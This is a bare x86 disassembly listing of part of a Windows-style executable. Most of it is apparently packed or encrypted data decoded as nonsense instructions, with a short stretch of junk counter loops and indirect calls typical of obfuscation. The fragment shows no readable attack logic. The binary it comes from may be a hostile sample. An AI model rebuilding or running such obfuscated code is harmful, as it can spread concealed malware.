  40d438:	stos   BYTE PTR es:[edi],al
  40d439:	and    DWORD PTR [edx+edx*4],edi
  40d43c:	xor    edi,0xffffff8f
  40d43f:	(bad)  
  40d440:	test   BYTE PTR [eax+0x9],ah
  40d443:	cmp    ax,0x6092
  40d447:	inc    esp
  40d448:	fild   QWORD PTR [esi]
  40d44a:	mov    bl,0xc0
  40d44c:	fsubr  DWORD PTR [edi-0x59bdb382]
  40d452:	js     0x40d4c1
  40d454:	pushf  
  40d455:	out    dx,al
  40d456:	push   ss
  40d457:	inc    eax
  40d458:	(bad)  
  40d459:	addr16 mov ecx,0x7f6cc58b
  40d45f:	bound  ebx,QWORD PTR [ebx]
  40d461:	or     al,0x76
  40d463:	mov    ch,0x5d
  40d465:	dec    ebp
  40d466:	cmc    
  40d467:	pusha  
  40d468:	adc    ebx,edx
  40d46a:	lock push 0xfffffff4
  40d46d:	enter  0x489d,0x7f
  40d471:	jg     0x40d454
  40d473:	and    eax,DWORD PTR [eax+edx*2]
  40d476:	jmp    0xbb60:0x3a64ac38
  40d47d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d47e:	push   edi
  40d47f:	mov    al,0x67
  40d481:	lds    eax,FWORD PTR [edx+0x66]
  40d484:	xchg   BYTE PTR [ecx-0x15],ch
  40d487:	xchg   ecx,eax
  40d488:	sbb    al,0xae
  40d48a:	(bad)  
  40d48b:	cli    
  40d48c:	(bad)  
  40d48d:	cmc    
  40d48e:	mov    eax,ds:0x1ec9b9bf
  40d493:	sbb    BYTE PTR [esi],0x12
  40d496:	leave  
  40d497:	jge    0x40d487
  40d499:	call   0xaf02:0xbe28b6ff
  40d4a0:	bnd je 0x40d432
  40d4a3:	aas    
  40d4a4:	into   
  40d4a5:	call   0x6f5d31e0
  40d4aa:	add    ecx,DWORD PTR [edi+ebp*8-0x37155b02]
  40d4b1:	out    dx,al
  40d4b2:	(bad)  
  40d4b3:	sub    al,0xb
  40d4b5:	inc    esi
  40d4b6:	add    ah,BYTE PTR [edi+0x5e5b9222]
  40d4bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4bd:	loop   0x40d51a
  40d4bf:	fimul  WORD PTR ss:[eax+0x1373a68c]
  40d4c6:	sti    
  40d4c7:	mov    esi,DWORD PTR [ebx]
  40d4c9:	pop    ebx
  40d4ca:	add    ebp,edx
  40d4cc:	xor    ecx,ebx
  40d4ce:	imul   ecx,ecx,0x634f834d
  40d4d4:	es sub ch,dh
  40d4d7:	push   esp
  40d4d8:	dec    esi
  40d4d9:	cmp    edi,DWORD PTR [edi]
  40d4db:	popa   
  40d4dc:	push   edx
  40d4dd:	xchg   ebx,eax
  40d4de:	lods   eax,DWORD PTR ds:[esi]
  40d4df:	iret   
  40d4e0:	sbb    DWORD PTR [eax-0x8],0x75
  40d4e4:	std    
  40d4e5:	(bad)  
  40d4e7:	test   BYTE PTR [eax-0x36d3b271],ah
  40d4ed:	int    0x11
  40d4ef:	imul   esi,DWORD PTR [edi],0xa1f63c23
  40d4f5:	mov    eax,0xb066b300
  40d4fa:	scas   eax,DWORD PTR es:[edi]
  40d4fb:	xor    DWORD PTR [ecx-0x43],0xffffffb4
  40d4ff:	adc    ecx,ebx
  40d501:	mov    dl,0x63
  40d503:	call   0x544f:0x875d4df1
  40d50a:	fisub  WORD PTR [esi]
  40d50c:	in     eax,0xc8
  40d50e:	imul   esi,DWORD PTR [edi+0x6e],0xce8c979f
  40d515:	jae    0x40d49b
  40d517:	dec    esi
  40d518:	mov    bl,BYTE PTR [edi+0x198fe1c5]
  40d51e:	int3   
  40d51f:	jb     0x40d4e4
  40d521:	or     cl,BYTE PTR [eax+ebp*2-0x24ceb6b0]
  40d528:	fcom   QWORD PTR [ebx-0x19]
  40d52b:	imul   ecx,DWORD PTR [ecx],0xb66ccc39
  40d531:	pop    ss
  40d532:	sbb    eax,0xb8993d79
  40d537:	or     BYTE PTR [edi-0x59],ch
  40d53a:	clc    
  40d53b:	adc    BYTE PTR [eax-0x6c13eccb],0x12
  40d542:	loope  0x40d57c
  40d544:	adc    al,dh
  40d546:	out    0xe8,al
  40d548:	out    dx,eax
  40d549:	push   esp
  40d54a:	sbb    dl,BYTE PTR [esi]
  40d54c:	mov    DWORD PTR [edi+0x5369e691],eax
  40d552:	or     eax,0x6f31de62
  40d557:	(bad)  
  40d558:	leave  
  40d559:	sar    BYTE PTR ds:[esi+0x5e],0x16
  40d55e:	jns    0x40d540
  40d560:	sbb    edx,DWORD PTR [eax]
  40d562:	add    edx,esp
  40d564:	sub    ch,0xf4
  40d567:	test   DWORD PTR [eax+0x35],eax
  40d56a:	rol    dl,1
  40d56c:	dec    ecx
  40d56d:	fstp   QWORD PTR [ebp+0x28]
  40d570:	addr16 mov esi,0x3b1cb944
  40d576:	popa   
  40d577:	cmp    al,0xda
  40d579:	adc    eax,DWORD PTR [eax+edi*8]
  40d57c:	adc    BYTE PTR [edx+0x2a],0xcf
  40d580:	push   esp
  40d581:	bound  edi,QWORD PTR [eax+edi*2+0x42]
  40d585:	adc    al,0xb4
  40d587:	outs   dx,BYTE PTR ds:[esi]
  40d588:	adc    al,0x78
  40d58a:	adc    BYTE PTR [esi],ah
  40d58c:	push   0x7b
  40d58e:	call   0xfd53:0xa977cb93
  40d595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d596:	test   BYTE PTR [edi+0x28c8c59c],dh
  40d59c:	(bad)  
  40d59d:	scas   eax,DWORD PTR es:[edi]
  40d59e:	les    ebp,FWORD PTR [eax+0x78252249]
  40d5a4:	adc    ah,BYTE PTR [ecx+0x22737db3]
  40d5aa:	jmp    0x40d563
  40d5ac:	mov    WORD PTR [ebx-0x33],fs
  40d5af:	or     BYTE PTR [edx+ebp*4],dl
  40d5b2:	pop    edx
  40d5b3:	loope  0x40d5ba
  40d5b5:	clc    
  40d5b6:	cwde   
  40d5b7:	xor    al,0x36
  40d5b9:	hlt    
  40d5ba:	xchg   ecx,eax
  40d5bb:	fstp   QWORD PTR [esi+0x66]
  40d5be:	mov    ch,0x37
  40d5c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5c1:	jb     0x40d5d8
  40d5c3:	sbb    DWORD PTR [eax-0x5a33c925],0x52
  40d5ca:	lea    edi,[ebx-0x3c]
  40d5cd:	inc    eax
  40d5ce:	xchg   ebp,eax
  40d5cf:	dec    edi
  40d5d0:	xor    eax,0xfc09bdae
  40d5d5:	push   ebp
  40d5d6:	sbb    al,0x7f
  40d5d8:	out    0x92,al
  40d5da:	(bad)  
  40d5db:	fcomp  st(2)
  40d5dd:	retf   
  40d5de:	out    dx,al
  40d5df:	push   ds
  40d5e0:	popf   
  40d5e1:	sbb    al,0x48
  40d5e3:	(bad)  
  40d5e5:	sbb    al,0x66
  40d5e7:	adc    ch,cl
  40d5e9:	xor    al,0xbe
  40d5eb:	ja     0x40d57e
  40d5ed:	adc    eax,0x89fc85a7
  40d5f2:	sub    ebp,esp
  40d5f4:	mov    BYTE PTR [ecx-0x6c],ah
  40d5f7:	mov    ds:0x921237a6,al
  40d5fc:	or     BYTE PTR [ebp-0x28],0xd8
  40d600:	outs   dx,DWORD PTR ds:[esi]
  40d601:	lds    ebp,FWORD PTR [ecx-0x74586146]
  40d607:	pop    ss
  40d608:	mov    DWORD PTR [edx],ebx
  40d60a:	inc    eax
  40d60b:	sub    bl,BYTE PTR [esi]
  40d60d:	iret   
  40d60e:	push   ebp
  40d60f:	mov    ebp,0xe8b7b7ab
  40d614:	imul   eax,ebx,0x7be37c12
  40d61a:	sub    eax,0x9fde90b6
  40d61f:	mov    DWORD PTR [edi+0x6c],edx
  40d622:	fnsetpm(287 only) 
  40d624:	stos   BYTE PTR es:[edi],al
  40d625:	enter  0x6cef,0x8b
  40d629:	pusha  
  40d62a:	cli    
  40d62b:	aam    0xf
  40d62d:	or     esp,DWORD PTR [ecx-0x4ec7d69b]
  40d633:	mov    gs,WORD PTR [ebx]
  40d635:	inc    ebp
  40d637:	sar    cl,0x9
  40d63a:	jle    0x40d639
  40d63c:	or     eax,0xdf7e6d91
  40d641:	or     ecx,ecx
  40d643:	inc    edx
  40d644:	xchg   esp,ecx
  40d646:	ins    DWORD PTR es:[edi],dx
  40d647:	das    
  40d648:	(bad)  
  40d64a:	dec    ebp
  40d64b:	and    eax,ebx
  40d64d:	pop    ss
  40d64e:	scas   eax,DWORD PTR es:[edi]
  40d64f:	cmp    eax,0x31904933
  40d654:	sub    BYTE PTR [eax+0x46],bh
  40d657:	jmp    0x92f4:0x54fbe155
  40d65e:	adc    eax,0x383f516b
  40d663:	repz (bad)
  40d666:	jae    0x40d6aa
  40d668:	out    0x49,eax
  40d66a:	push   eax
  40d66b:	xchg   ebx,eax
  40d66c:	(bad)  
  40d66d:	jg     0x40d688
  40d66f:	xchg   esi,eax
  40d670:	popa   
  40d671:	pop    esi
  40d672:	imul   BYTE PTR [esi-0x354e92bc]
  40d678:	jge    0x40d647
  40d67a:	in     eax,dx
  40d67b:	push   ebp
  40d67c:	test   DWORD PTR [ecx-0xa123071],edx
  40d682:	ffreep st(3)
  40d684:	shl    dh,cl
  40d686:	pop    ebp
  40d687:	sub    al,0xde
  40d689:	push   ss
  40d68a:	scas   eax,DWORD PTR es:[edi]
  40d68b:	push   esp
  40d68c:	push   ds
  40d68d:	mov    WORD PTR [edi-0x3d],?
  40d690:	add    dh,BYTE PTR [esp+eax*1+0xc]
  40d694:	aam    0xfd
  40d696:	mov    edi,0xf5eace1c
  40d69b:	mov    eax,0x36e11bdc
  40d6a0:	ficomp WORD PTR [esi]
  40d6a2:	jne    0x40d6b7
  40d6a4:	lock cmc 
  40d6a6:	lahf   
  40d6a7:	mov    ecx,0xa2788763
  40d6ac:	lods   al,BYTE PTR ds:[esi]
  40d6ad:	rol    dl,1
  40d6af:	add    esi,DWORD PTR [esi+0x14]
  40d6b2:	arpl   WORD PTR [ecx+0x25714e86],cx
  40d6b8:	pop    ds
  40d6b9:	popa   
  40d6ba:	adc    BYTE PTR [edi-0x406ff0f6],0xad
  40d6c1:	mov    ah,0x88
  40d6c3:	nop
  40d6c4:	adc    cl,BYTE PTR [edi-0x4b]
  40d6c7:	xor    al,0xed
  40d6c9:	dec    ebx
  40d6ca:	inc    ebp
  40d6cb:	sub    ebx,DWORD PTR [ebx-0x5aadf041]
  40d6d1:	adc    al,BYTE PTR [edi]
  40d6d3:	mov    ebp,ebx
  40d6d5:	and    ah,ah
  40d6d7:	out    dx,eax
  40d6d8:	mov    dl,0x39
  40d6da:	cmp    BYTE PTR [edi-0x18],cl
  40d6dd:	lods   eax,DWORD PTR ds:[esi]
  40d6de:	mov    al,0xbf
  40d6e0:	mov    cl,0x37
  40d6e2:	cli    
  40d6e3:	int    0x3f
  40d6e5:	call   0xef9e08fa
  40d6ea:	fucomip st,st(6)
  40d6ec:	push   eax
  40d6ed:	out    0x60,eax
  40d6ef:	or     al,0xe1
  40d6f1:	and    DWORD PTR [esi+0x2f],ebp
  40d6f4:	dec    ebx
  40d6f5:	sbb    eax,0x29648cfe
  40d6fa:	mov    ecx,0x4573
  40d6ff:	add    edx,ecx
  40d701:	not    esi
  40d703:	mov    esi,0x7879
  40d708:	or     edi,0x6bdc
  40d70e:	mov    edi,0x1556
  40d713:	sub    DWORD PTR ds:0x43441d,0x432dde
  40d71d:	xchg   esi,ecx
  40d71f:	sub    edx,edi
  40d721:	xor    DWORD PTR ds:0x434411,0x1648
  40d72b:	xor    esi,esi
  40d72d:	and    DWORD PTR ds:0x432dca,0x0
  40d737:	jmp    0x40d749
  40d73c:	mov    ecx,DWORD PTR ds:0x432dca
  40d742:	inc    ecx
  40d743:	mov    DWORD PTR ds:0x432dca,ecx
  40d749:	cmp    DWORD PTR ds:0x432dca,0x11
  40d750:	jae    0x40d7ce
  40d756:	cmp    DWORD PTR ds:0x432dca,0x1e
  40d75d:	jne    0x40d76e
  40d763:	push   0x470a
  40d768:	call   DWORD PTR ds:0x432c72
  40d76e:	jmp    0x40d73c
  40d773:	and    DWORD PTR ds:0x434386,0x0
  40d77d:	mov    ecx,DWORD PTR ds:0x434386
  40d783:	inc    ecx
  40d784:	mov    DWORD PTR ds:0x434386,ecx
  40d78a:	cmp    DWORD PTR ds:0x434386,0xa
  40d791:	jne    0x40d7a7
  40d797:	push   0x4328db
  40d79c:	push   0x43287d
  40d7a1:	call   DWORD PTR ds:0x4329f6
  40d7a7:	cmp    DWORD PTR ds:0x434386,0x9
  40d7ae:	jne    0x40d7c1
  40d7b4:	mov    ecx,DWORD PTR ds:0x434386
  40d7ba:	inc    ecx
  40d7bb:	mov    DWORD PTR ds:0x434386,ecx
  40d7c1:	cmp    DWORD PTR ds:0x434386,0x18
  40d7c8:	jb     0x40d77d
  40d7ce:	mov    DWORD PTR [ebp-0x28],esi
  40d7d1:	mov    DWORD PTR [ebp-0x2c],esi
  40d7d4:	and    DWORD PTR ds:0x434396,0x0
  40d7de:	jmp    0x40d7f0
  40d7e3:	mov    ecx,DWORD PTR ds:0x434396
  40d7e9:	inc    ecx
  40d7ea:	mov    DWORD PTR ds:0x434396,ecx
  40d7f0:	cmp    DWORD PTR ds:0x434396,0x1f
  40d7f7:	jae    0x40d83c
  40d7fd:	cmp    DWORD PTR ds:0x434396,0x11
  40d804:	jne    0x40d813
  40d80a:	push   DWORD PTR [ebp-0x28]
  40d80d:	call   DWORD PTR ds:0x4329fa
  40d813:	cmp    DWORD PTR ds:0x434396,0x10
  40d81a:	jne    0x40d82d
  40d820:	mov    ecx,DWORD PTR ds:0x434396
  40d826:	inc    ecx
  40d827:	mov    DWORD PTR ds:0x434396,ecx
  40d82d:	jmp    0x40d7e3
  40d832:	or     DWORD PTR ds:0x432de2,0x1ed3
  40d83c:	mov    DWORD PTR [ebp-0x14],esi
  40d83f:	adc    DWORD PTR ds:0x432704,0x1c7c
  40d849:	jmp    0x40dc3d
  40d84e:	addr16 int3 
  40d850:	ss data16 mov cl,0x62
  40d854:	ja     0x40d81f
  40d856:	or     bl,BYTE PTR [esi-0x3c]
  40d859:	in     al,0x98
  40d85b:	lods   al,BYTE PTR ds:[esi]
  40d85c:	test   eax,0x708a575b
  40d861:	jo     0x40d8ac
  40d863:	jge    0x40d8d5
  40d865:	jo     0x40d8c2
  40d867:	adc    ch,BYTE PTR [edx+0x7c]
  40d86a:	xchg   ecx,eax
  40d86b:	data16 adc BYTE PTR [edx+ebx*2-0x4e2c88b3],dh
  40d873:	outs   dx,DWORD PTR ds:[esi]
  40d874:	mov    ds:0xa7c0fb4e,eax
  40d879:	test   eax,ebp
  40d87b:	push   0x23da8b7c
  40d880:	int3   
  40d881:	retf   
  40d882:	dec    eax
  40d883:	pop    eax
  40d884:	mov    esp,DWORD PTR [ebx+edx*8+0x4bd813ff]
  40d88b:	adc    bl,BYTE PTR [edx+0xe]
  40d88e:	and    esi,esp
  40d890:	loopne 0x40d860
  40d892:	pushw  cs
  40d894:	lock sub al,ch
  40d897:	popf   
  40d898:	push   eax
  40d899:	push   ds
  40d89a:	and    eax,0x781b8745
  40d89f:	ds cs repz jns 0x40d8b1
  40d8a4:	dec    esi
  40d8a5:	jecxz  0x40d8d4
  40d8a7:	arpl   sp,bx
  40d8a9:	push   edx
  40d8aa:	xchg   ebx,eax
  40d8ab:	xchg   bh,al
  40d8ad:	sar    ah,cl
  40d8af:	inc    eax
  40d8b0:	lods   al,BYTE PTR ds:[esi]
  40d8b1:	add    dh,BYTE PTR [esi-0x43534384]
  40d8b7:	pusha  
  40d8b8:	dec    edx
  40d8b9:	pushf  
  40d8ba:	jmp    0x40d8e9
  40d8bc:	pusha  
  40d8bd:	jo     0x40d8be
  40d8bf:	lea    ecx,[ecx-0x4c]
  40d8c2:	clc    
  40d8c3:	call   0x55a:0x70a2a53d
  40d8ca:	js     0x40d876
  40d8cc:	call   0x824d:0x2ece180
  40d8d3:	mov    edx,0x54228cef
  40d8d8:	aaa    
  40d8d9:	jl     0x40d89f
  40d8db:	jecxz  0x40d8b3
  40d8dd:	pop    ecx
  40d8de:	inc    edi
  40d8df:	adc    DWORD PTR [edx+0x437e4bb6],eax
  40d8e5:	in     al,dx
  40d8e6:	stos   DWORD PTR es:[edi],eax
  40d8e7:	loopne 0x40d8b3
  40d8e9:	out    dx,eax
  40d8ea:	push   DWORD PTR [esi+0x75014495]
  40d8f0:	lahf   
  40d8f1:	mov    ah,0x52
  40d8f3:	mov    dh,0xaa
  40d8f5:	(bad)
  40d8f8:	and    eax,0xb29a2579
  40d8fd:	xlat   BYTE PTR ss:[ebx]
  40d8ff:	icebp  
  40d900:	test   eax,0xa7d0d821
  40d905:	jo     0x40d92d
  40d907:	lea    esp,[edx+0x526f18f2]
  40d90d:	jb     0x40d93c
  40d90f:	jae    0x40d98c
  40d911:	scas   al,BYTE PTR es:[edi]
  40d912:	ds cmp edx,esi
  40d915:	loopne 0x40d98f
  40d917:	icebp  
  40d918:	fdecstp 
  40d91a:	pop    ebp
  40d91b:	nop
  40d91c:	loope  0x40d8be
  40d91e:	scas   al,BYTE PTR es:[edi]
  40d91f:	add    edi,ecx
  40d921:	and    al,0xdb
  40d923:	jae    0x40d956
  40d925:	push   esi
  40d926:	loope  0x40d906
  40d928:	or     dl,dl
  40d92a:	cmp    al,0x31
  40d92c:	sbb    dl,BYTE PTR [ebp+0x6d]
  40d92f:	pop    esp
  40d930:	fild   QWORD PTR [esi-0x1b]
  40d933:	cld    
  40d934:	mov    eax,0xe8838e25
  40d939:	xchg   al,bl
  40d93b:	dec    ebx
  40d93c:	cmp    ah,BYTE PTR [ebp-0x1ed915f0]
  40d942:	fs (bad) 
  40d944:	inc    ebp
  40d946:	and    DWORD PTR [ecx+0x1cf4658e],ebx
  40d94c:	jl     0x40d8f2
  40d94e:	xchg   edx,eax
  40d94f:	push   ss
  40d950:	iret   
  40d951:	lds    ebp,FWORD PTR [esi]
  40d953:	push   ebp
  40d954:	push   edx
  40d955:	pop    ebp
  40d956:	arpl   WORD PTR [esi+0x2998aa6],cx
  40d95c:	cmp    eax,ebp
  40d95e:	mov    edx,ecx
  40d960:	mov    esp,0x560577ac
  40d965:	dec    ebp
  40d966:	mov    edx,0x5d8e2056
  40d96b:	daa    
  40d96c:	scas   al,BYTE PTR es:[edi]
  40d96d:	or     ch,BYTE PTR [esi]
  40d96f:	retf   
  40d970:	mov    eax,ds:0xf452a23d
  40d975:	imul   esi,esi,0x77e9ce40
  40d97b:	push   edi
  40d97c:	ins    BYTE PTR es:[edi],dx
  40d97d:	add    BYTE PTR [ebp-0x6bf93af2],0x15
  40d984:	jp     0x40d9f0
  40d986:	add    BYTE PTR [eax-0x62],dl
  40d989:	xchg   ebp,eax
  40d98a:	xchg   bl,ah
  40d98c:	out    0xd4,eax
  40d98e:	sahf   
  40d98f:	pop    edi
  40d990:	or     eax,0x29daa93c
  40d995:	pop    esp
  40d996:	call   0x73b4:0x2160bf8e
  40d99d:	sbb    edx,DWORD PTR [ebp-0x582fcb0c]
  40d9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9a4:	out    0xe8,al
  40d9a6:	dec    eax
  40d9a7:	(bad)  
  40d9a8:	sbb    esi,eax
  40d9aa:	sub    ch,ah
  40d9ac:	int    0x2
  40d9ae:	mov    ebp,0xc522c652
  40d9b3:	mov    ah,BYTE PTR [edx-0x40]
  40d9b6:	fs repz and al,0x65
  40d9ba:	pop    esi
  40d9bb:	pop    esi
  40d9bc:	dec    eax
  40d9bd:	(bad)  
  40d9be:	sahf   
  40d9bf:	push   esi
  40d9c0:	es je  0x40d996
  40d9c3:	mov    esi,0xc4302c29
  40d9c8:	(bad)  
  40d9c9:	pusha  
  40d9ca:	add    al,0xbb
  40d9cc:	(bad)  
  40d9ce:	mov    WORD PTR [ecx+eax*8-0x3e],fs
  40d9d2:	sbb    al,BYTE PTR [ebp-0x78]
  40d9d5:	out    dx,al
  40d9d6:	sahf   
  40d9d7:	fiadd  WORD PTR [ebx-0x5f]
  40d9da:	in     eax,dx
  40d9db:	lahf   
  40d9dc:	inc    edi
  40d9dd:	adc    DWORD PTR [edx-0x4d6d3c07],edx
  40d9e3:	(bad)  
  40d9e4:	sar    DWORD PTR [edx-0x2b3c2623],cl
  40d9ea:	popf   
  40d9eb:	aaa    
  40d9ec:	xor    bl,BYTE PTR [eax-0x16]
  40d9ef:	stos   DWORD PTR es:[edi],eax
  40d9f0:	push   esp
  40d9f1:	jg     0x40da0a
  40d9f3:	cld    
  40d9f4:	and    BYTE PTR [ecx],ch
  40d9f6:	lods   al,BYTE PTR ds:[esi]
  40d9f7:	data16 fistp WORD PTR [ecx+0x51]
  40d9fb:	inc    ebx
  40d9fc:	mov    DWORD PTR [eax+0x509b1b42],edi
  40da02:	add    al,0x19
  40da04:	and    bh,BYTE PTR [edx-0x64]
  40da07:	fwait
  40da08:	xchg   esp,eax
  40da09:	fdiv   DWORD PTR [ebx+0xf48c8f5]
  40da0f:	sbb    DWORD PTR [eax],eax
  40da11:	inc    edi
  40da12:	xlat   BYTE PTR ds:[ebx]
  40da13:	(bad)  
  40da14:	sub    esp,DWORD PTR [ecx+esi*4-0x3ba147e2]
  40da1b:	push   ebp
  40da1c:	or     ebp,eax
  40da1e:	in     al,dx
  40da1f:	retf   
  40da20:	sbb    bh,BYTE PTR [ecx+0x5b9696dd]
  40da26:	push   edi
  40da27:	pop    ebx
  40da28:	push   0xffffff9d
  40da2a:	mov    dl,BYTE PTR [ebx]
  40da2c:	ins    DWORD PTR es:[edi],dx
  40da2d:	shl    BYTE PTR [eax-0x53],0x80
  40da31:	cmp    al,0xc2
  40da33:	cli    
  40da34:	ret    
  40da35:	and    BYTE PTR [ecx],dl
  40da37:	lods   eax,DWORD PTR ds:[esi]
  40da38:	retf   0x32e8
  40da3b:	pop    edx
  40da3c:	mov    al,0xaf
  40da3e:	shl    BYTE PTR [edx-0x2a],cl
  40da41:	int3   
  40da42:	sub    eax,0x22215356
  40da47:	mov    eax,0xeffb3df9
  40da4c:	mov    ebx,0x45be329c
  40da51:	fild   DWORD PTR ds:0xa32a0805
  40da57:	xchg   ecx,eax
  40da58:	sub    bh,BYTE PTR [ebx-0x48]
  40da5b:	js     0x40da49
  40da5d:	enter  0xf92b,0x8d
  40da61:	fadd   QWORD PTR [eax+0x540c8aa2]
  40da67:	mov    al,ch
  40da69:	dec    edi
  40da6a:	mov    cl,0x9c
  40da6c:	ds jge 0x40da8c
  40da6f:	ins    BYTE PTR es:[edi],dx
  40da70:	fwait
  40da71:	add    eax,0x66174f0f
  40da76:	inc    edx
  40da77:	aad    0x74
  40da79:	push   ecx
  40da7a:	cs scas eax,DWORD PTR es:[edi]
  40da7c:	sti    
  40da7d:	mov    ds:0x3d0c50bf,al
  40da82:	dec    ebp
  40da83:	dec    ebp
  40da84:	outs   dx,BYTE PTR ds:[esi]
  40da85:	int    0x3b
  40da87:	sbb    dh,al
  40da89:	adc    DWORD PTR [ebx],esp
  40da8b:	sbb    eax,0x40f95550
  40da90:	adc    ch,BYTE PTR [edi-0x69]
  40da93:	les    esp,FWORD PTR [esi+0x7734e1ea]
  40da99:	pop    DWORD PTR [eax]
  40da9b:	mov    bh,0xc
  40da9d:	mov    esi,0xdf28af2c
  40daa2:	xor    al,0x3e
  40daa4:	cmp    dl,ah
  40daa6:	adc    dh,BYTE PTR [edi+0x21]
  40daa9:	jle    0x40db28
  40daab:	retf   
  40daac:	mov    ecx,0xb66db6f6
  40dab1:	push   eax
  40dab2:	daa    
  40dab3:	pop    ebx
  40dab4:	enter  0x815c,0x1a
  40dab8:	push   ss
  40dab9:	dec    ecx
  40daba:	pushf  
  40dabb:	(bad)  
  40dabc:	adc    esi,eax
  40dabe:	stos   DWORD PTR es:[edi],eax
  40dabf:	or     eax,0xa8d5afdc
  40dac4:	cmp    BYTE PTR ds:0xe153815c,cl
  40daca:	sar    BYTE PTR [esi+0x5e365f4a],cl
  40dad0:	push   0x17
  40dad2:	add    edx,ebx
  40dad4:	pop    ebx
  40dad5:	sbb    BYTE PTR [eax-0x5b136cc],bl
  40dadb:	mov    ebx,0x6dc7d074
  40dae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae1:	mov    ebp,0xf23d624
  40dae6:	add    esi,DWORD PTR [edi]
  40dae8:	pop    edi
  40dae9:	add    edi,0xffffffdc
  40daec:	xor    ah,BYTE PTR [ebp+eiz*1+0x70]
  40daf0:	xor    eax,edi
  40daf2:	adc    eax,0xd10663ff
  40daf7:	sbb    ecx,edi
  40daf9:	mov    BYTE PTR [ecx],bl
  40dafb:	sar    DWORD PTR [eax],0x30
  40dafe:	fidivr WORD PTR ds:0xcc9a9fe2
  40db04:	loopne 0x40dabf
  40db06:	in     eax,0xac
  40db08:	iret   
  40db09:	popf   
  40db0a:	sar    bh,0x3f
  40db0d:	pop    ebx
  40db0e:	(bad)  
  40db0f:	mov    eax,0xcf5cc5ca
  40db14:	add    BYTE PTR [edx+0x4465376f],0xcc
  40db1b:	jmp    0x1388d70a
  40db20:	lds    ecx,FWORD PTR fs:[ebp+0x1c]
  40db24:	jmp    0x40db22
  40db26:	mov    edi,0xd7ad416
  40db2b:	adc    cl,BYTE PTR [eax+0x15fa8d4c]
  40db31:	push   esp
  40db32:	fimul  WORD PTR [eax+eax*2]
  40db35:	aad    0xdb
  40db37:	mov    eax,0x90dd378b
  40db3c:	ss xor eax,edi
  40db3f:	out    dx,eax
  40db40:	rcr    DWORD PTR [ecx+ecx*8-0x6fe5f2fa],1
  40db47:	mov    dl,dl
  40db49:	call   0x4a0ccbfd
  40db4e:	jg     0x40dae5
  40db50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db51:	loope  0x40db5f
  40db53:	xchg   esp,eax
  40db54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db55:	xor    al,0x11
  40db57:	sub    dl,dl
  40db59:	mov    ebx,0xea39183f
  40db5e:	lods   al,BYTE PTR ds:[esi]
  40db5f:	ja     0x40db49
  40db61:	pop    ss
  40db62:	and    al,0x7a
  40db64:	sub    BYTE PTR [esi-0x11953f02],cl
  40db6a:	and    bl,ch
  40db6c:	ror    DWORD PTR [edx*8+0x9c3fcba],0xbe
  40db74:	std    
  40db75:	rcr    BYTE PTR [eax-0x53],1
  40db78:	inc    ebp
  40db79:	add    al,0xf1
  40db7b:	add    eax,0x61affbc5
  40db80:	cdq    
  40db81:	bnd jbe 0x40dba9
  40db84:	loop   0x40dbe2
  40db86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db87:	cmp    esi,0x10fb3423
  40db8d:	cmc    
  40db8e:	std    
  40db8f:	fiadd  DWORD PTR [edx-0x36]
  40db92:	bswap  edi
  40db94:	jl     0x40dbd0
  40db96:	stos   DWORD PTR es:[edi],eax
  40db97:	pusha  
  40db98:	test   BYTE PTR [ecx-0x28eea55c],dh
  40db9e:	bswap  ebp
  40dba0:	leave  
  40dba1:	dec    eax
  40dba2:	add    BYTE PTR [ebx],0x37
  40dba5:	outs   dx,BYTE PTR ds:[esi]
  40dba6:	mov    ds:0xda1b5f55,eax
  40dbab:	hlt    
  40dbac:	arpl   dx,ax
  40dbae:	add    DWORD PTR [eax+0x52ed7a3a],esi
  40dbb4:	cli    
  40dbb5:	push   eax
  40dbb6:	sbb    eax,0x2cf53f91
  40dbbb:	sub    eax,0x98dfc1b2
  40dbc0:	push   esi
  40dbc1:	xchg   edi,eax
  40dbc2:	retf   
  40dbc3:	lahf   
  40dbc4:	push   ecx
  40dbc5:	jae    0x40dba3
  40dbc7:	fsubp  st(0),st
  40dbc9:	jae    0x40dc3e
  40dbcb:	in     ax,0x96
  40dbce:	mov    ecx,0x8fb98a2c
  40dbd3:	cs js  0x40dc10
  40dbd6:	(bad)  
  40dbd7:	mov    esp,0x5f0afeb7
  40dbdc:	dec    ecx
  40dbdd:	dec    edi
  40dbde:	(bad)  
  40dbdf:	lock mov ds:0x33a39fc5,al
  40dbe5:	mov    edi,DWORD PTR [ebp+esi*2+0x1fa14515]
  40dbec:	jnp    0x40dbb5
  40dbee:	and    al,0xe1
  40dbf0:	mov    DWORD PTR [esp+edx*8],esp
  40dbf3:	fisub  WORD PTR [esi]
  40dbf5:	jbe    0x40dc2a
  40dbf7:	mov    edi,0xbe048843
  40dbfc:	sub    DWORD PTR [edi-0x26],ecx
  40dbff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc00:	fldenv [eax-0x72]
  40dc03:	mov    ecx,0xce384f5f
  40dc08:	cmp    esp,ecx
  40dc0a:	icebp  
  40dc0b:	dec    ebx
  40dc0c:	sti    
  40dc0d:	xchg   edi,eax
  40dc0e:	fmul   st(0),st
  40dc10:	xchg   esi,eax
  40dc11:	jne    0x40dc82
  40dc13:	lock jns 0x40dc2f
  40dc16:	push   es
  40dc17:	push   edx
  40dc18:	das    
  40dc19:	fwait
  40dc1a:	(bad)  
  40dc1c:	xor    DWORD PTR [ecx+0x6],ecx
  40dc1f:	neg    DWORD PTR [ebx-0x659ddc08]
  40dc25:	or     esi,DWORD PTR [esi-0x2c6e366d]
  40dc2b:	pop    esp
  40dc2c:	xchg   DWORD PTR [ecx-0x57a57af9],ecx
  40dc32:	inc    edx
  40dc33:	xchg   ebx,eax
  40dc34:	xor    al,0x2a
  40dc36:	mov    WORD PTR [edx+0x4e53596],ss
  40dc3c:	jns    0x40dbc7
  40dc3e:	jne    0x40dc38
  40dc40:	mov    ecx,DWORD PTR ds:0x43439a
  40dc46:	and    DWORD PTR ds:0x432dc6,ecx
  40dc4c:	mov    ecx,DWORD PTR [ebp-0x18]
